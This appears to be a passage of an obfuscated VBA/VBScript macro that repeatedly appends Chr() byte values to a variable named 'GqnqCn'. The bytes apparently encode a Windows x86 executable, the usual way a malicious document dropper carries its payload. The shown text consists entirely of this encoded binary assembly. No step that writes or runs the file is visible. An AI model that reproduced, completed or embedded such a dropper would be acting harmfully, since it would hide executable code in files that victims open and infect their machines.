GqnqCn=GqnqCn&Chr(15)&Chr(133)&Chr(234)&Chr(0)&Chr(0)&Chr(0)&Chr(246)&Chr(5)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(15)&Chr(133)&Chr(221)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(13)&Chr(232)&Chr(226)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(67)&Chr(4)&Chr(163)&Chr(132)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(8)&Chr(163)&Chr(136)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(12)&Chr(163)&Chr(140)&Chr(178)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(131)&Chr(248)&Chr(5)&Chr(125)&Chr(16)&Chr(102)&Chr(139)&Chr(76)&Chr(67)&Chr(16)&Chr(102)&Chr(137)&Chr(12)&Chr(69)&Chr(120)&Chr(178)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(232)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(61)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(125)&Chr(13)&Chr(138)&Chr(76)&Chr(24)&Chr(28)&Chr(136)&Chr(136)&Chr(0)
GqnqCn=GqnqCn&Chr(166)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(233)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(61)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(125)&Chr(16)&Chr(138)&Chr(140)&Chr(24)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(136)&Chr(136)&Chr(8)&Chr(167)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(230)&Chr(255)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(19)&Chr(161)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(61)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(111)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(29)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(83)&Chr(255)&Chr(215)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(48)&Chr(106)&Chr(13)&Chr(232)&Chr(91)&Chr(236)&Chr(255)&Chr(255)&Chr(89)
GqnqCn=GqnqCn&Chr(195)&Chr(235)&Chr(37)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(32)&Chr(129)&Chr(251)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(83)&Chr(232)&Chr(57)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(234)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(4)&Chr(131)&Chr(101)&Chr(224)&Chr(0)&Chr(139)&Chr(69)&Chr(224)&Chr(232)&Chr(249)&Chr(232)&Chr(255)&Chr(255)&Chr(195)&Chr(131)&Chr(61)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(18)&Chr(106)&Chr(253)&Chr(232)&Chr(86)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(199)&Chr(5)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(136)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(137)&Chr(232)&Chr(255)&Chr(255)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(116)&Chr(117)&Chr(131)&Chr(61)
GqnqCn=GqnqCn&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(67)&Chr(106)&Chr(4)&Chr(232)&Chr(194)&Chr(236)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(86)&Chr(232)&Chr(201)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(133)&Chr(192)&Chr(116)&Chr(9)&Chr(86)&Chr(80)&Chr(232)&Chr(234)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(228)&Chr(0)&Chr(117)&Chr(55)&Chr(255)&Chr(117)&Chr(8)&Chr(235)&Chr(10)&Chr(106)&Chr(4)&Chr(232)&Chr(174)&Chr(235)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(86)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(232)&Chr(64)&Chr(238)&Chr(255)&Chr(255)&Chr(139)&Chr(240)
GqnqCn=GqnqCn&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(240)&Chr(237)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(89)&Chr(232)&Chr(77)&Chr(232)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(41)&Chr(28)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(133)&Chr(255)&Chr(117)&Chr(39)&Chr(57)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(202)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(106)
GqnqCn=GqnqCn&Chr(0)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(169)&Chr(28)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(255)&Chr(117)&Chr(39)&Chr(57)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(195)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(125)&Chr(29)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(89)&Chr(133)&Chr(255)&Chr(117)&Chr(44)&Chr(57)&Chr(69)&Chr(12)&Chr(116)&Chr(39)&Chr(57)
GqnqCn=GqnqCn&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(193)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(86)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(193)&Chr(139)&Chr(209)&Chr(3)&Chr(198)&Chr(59)&Chr(254)&Chr(118)&Chr(8)&Chr(59)&Chr(248)&Chr(15)&Chr(130)&Chr(164)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(249)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(114)&Chr(31)&Chr(131)&Chr(61)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(22)&Chr(87)&Chr(86)&Chr(131)&Chr(231)&Chr(15)&Chr(131)&Chr(230)
GqnqCn=GqnqCn&Chr(15)&Chr(59)&Chr(254)&Chr(94)&Chr(95)&Chr(117)&Chr(8)&Chr(94)&Chr(95)&Chr(93)&Chr(233)&Chr(158)&Chr(31)&Chr(0)&Chr(0)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(21)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(42)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(233)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(3)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(24)&Chr(63)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(20)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(255)&Chr(36)&Chr(141)&Chr(152)&Chr(63)&Chr(64)&Chr(0)&Chr(144)&Chr(40)&Chr(63)&Chr(64)&Chr(0)&Chr(84)&Chr(63)&Chr(64)&Chr(0)&Chr(120)&Chr(63)&Chr(64)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)
GqnqCn=GqnqCn&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(198)&Chr(3)&Chr(131)&Chr(199)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(204)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(198)&Chr(2)&Chr(131)&Chr(199)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(166)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(131)&Chr(198)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(243)&Chr(165)&Chr(255)&Chr(36)
GqnqCn=GqnqCn&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(251)&Chr(63)&Chr(64)&Chr(0)&Chr(232)&Chr(63)&Chr(64)&Chr(0)&Chr(224)&Chr(63)&Chr(64)&Chr(0)&Chr(216)&Chr(63)&Chr(64)&Chr(0)&Chr(208)&Chr(63)&Chr(64)&Chr(0)&Chr(200)&Chr(63)&Chr(64)&Chr(0)&Chr(192)&Chr(63)&Chr(64)&Chr(0)&Chr(184)&Chr(63)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(228)&Chr(137)&Chr(68)&Chr(143)&Chr(228)&Chr(139)&Chr(68)&Chr(142)&Chr(232)&Chr(137)&Chr(68)&Chr(143)&Chr(232)&Chr(139)&Chr(68)&Chr(142)&Chr(236)&Chr(137)&Chr(68)&Chr(143)&Chr(236)&Chr(139)&Chr(68)&Chr(142)&Chr(240)&Chr(137)&Chr(68)&Chr(143)&Chr(240)&Chr(139)&Chr(68)&Chr(142)&Chr(244)&Chr(137)&Chr(68)&Chr(143)&Chr(244)&Chr(139)&Chr(68)&Chr(142)&Chr(248)&Chr(137)&Chr(68)&Chr(143)&Chr(248)&Chr(139)&Chr(68)&Chr(142)&Chr(252)&Chr(137)&Chr(68)&Chr(143)&Chr(252)&Chr(141)&Chr(4)&Chr(141)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(20)&Chr(64)&Chr(64)&Chr(0)&Chr(28)&Chr(64)&Chr(64)&Chr(0)&Chr(40)&Chr(64)&Chr(64)&Chr(0)&Chr(60)&Chr(64)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(141)&Chr(116)&Chr(49)&Chr(252)
GqnqCn=GqnqCn&Chr(141)&Chr(124)&Chr(57)&Chr(252)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(36)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(13)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(247)&Chr(217)&Chr(255)&Chr(36)&Chr(141)&Chr(80)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(249)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(43)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(164)&Chr(64)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(144)&Chr(180)&Chr(64)&Chr(64)&Chr(0)&Chr(216)&Chr(64)&Chr(64)&Chr(0)&Chr(0)&Chr(65)&Chr(64)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)
GqnqCn=GqnqCn&Chr(131)&Chr(238)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(239)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(178)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(238)&Chr(2)&Chr(131)&Chr(239)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(238)&Chr(3)&Chr(131)&Chr(239)&Chr(3)&Chr(131)&Chr(249)&Chr(8)
GqnqCn=GqnqCn&Chr(15)&Chr(130)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(84)&Chr(65)&Chr(64)&Chr(0)&Chr(92)&Chr(65)&Chr(64)&Chr(0)&Chr(100)&Chr(65)&Chr(64)&Chr(0)&Chr(108)&Chr(65)&Chr(64)&Chr(0)&Chr(116)&Chr(65)&Chr(64)&Chr(0)&Chr(124)&Chr(65)&Chr(64)&Chr(0)&Chr(132)&Chr(65)&Chr(64)&Chr(0)&Chr(151)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(28)&Chr(137)&Chr(68)&Chr(143)&Chr(28)&Chr(139)&Chr(68)&Chr(142)&Chr(24)&Chr(137)&Chr(68)&Chr(143)&Chr(24)&Chr(139)&Chr(68)&Chr(142)&Chr(20)&Chr(137)&Chr(68)&Chr(143)&Chr(20)&Chr(139)&Chr(68)&Chr(142)&Chr(16)&Chr(137)&Chr(68)&Chr(143)&Chr(16)&Chr(139)&Chr(68)&Chr(142)&Chr(12)&Chr(137)&Chr(68)&Chr(143)&Chr(12)&Chr(139)&Chr(68)&Chr(142)&Chr(8)&Chr(137)&Chr(68)&Chr(143)&Chr(8)
GqnqCn=GqnqCn&Chr(139)&Chr(68)&Chr(142)&Chr(4)&Chr(137)&Chr(68)&Chr(143)&Chr(4)&Chr(141)&Chr(4)&Chr(141)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(176)&Chr(65)&Chr(64)&Chr(0)&Chr(184)&Chr(65)&Chr(64)&Chr(0)&Chr(200)&Chr(65)&Chr(64)&Chr(0)&Chr(220)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)
GqnqCn=GqnqCn&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(139)&Chr(134)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(219)&Chr(87)&Chr(59)&Chr(195)&Chr(116)&Chr(111)&Chr(61)&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(104)&Chr(139)&Chr(134)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(94)&Chr(57)&Chr(24)&Chr(117)&Chr(90)&Chr(139)&Chr(134)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(23)&Chr(57)&Chr(24)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(238)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(177)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(139)&Chr(134)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(23)
GqnqCn=GqnqCn&Chr(57)&Chr(24)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(205)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(75)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(255)&Chr(182)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(181)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(170)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(139)&Chr(134)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(68)&Chr(57)&Chr(24)&Chr(117)&Chr(64)&Chr(139)&Chr(134)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(45)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(137)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(134)&Chr(204)&Chr(0)&Chr(0)&Chr(0)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(43)&Chr(199)&Chr(80)&Chr(232)&Chr(118)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(134)&Chr(208)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(43)&Chr(199)&Chr(80)&Chr(232)&Chr(104)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(93)&Chr(250)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(141)&Chr(190)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(7)&Chr(61)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(23)&Chr(57)&Chr(152)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(15)&Chr(80)&Chr(232)&Chr(49)&Chr(29)&Chr(0)&Chr(0)&Chr(255)&Chr(55)&Chr(232)&Chr(54)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(141)&Chr(126)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(127)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(17)&Chr(139)&Chr(7)&Chr(59)&Chr(195)&Chr(116)&Chr(11)&Chr(57)&Chr(24)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(17)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(57)
GqnqCn=GqnqCn&Chr(95)&Chr(252)&Chr(116)&Chr(18)&Chr(139)&Chr(71)&Chr(4)&Chr(59)&Chr(195)&Chr(116)&Chr(11)&Chr(57)&Chr(24)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(250)&Chr(249)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(199)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(199)&Chr(86)&Chr(232)&Chr(235)&Chr(249)&Chr(255)&Chr(255)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(87)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)
GqnqCn=GqnqCn&Chr(214)&Chr(139)&Chr(135)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(141)&Chr(95)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(123)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(3)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(123)&Chr(252)&Chr(0)&Chr(116)&Chr(10)&Chr(139)&Chr(67)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(195)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(214)&Chr(139)&Chr(135)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(131)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(141)&Chr(95)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(123)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(3)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(123)&Chr(252)&Chr(0)&Chr(116)&Chr(10)&Chr(139)
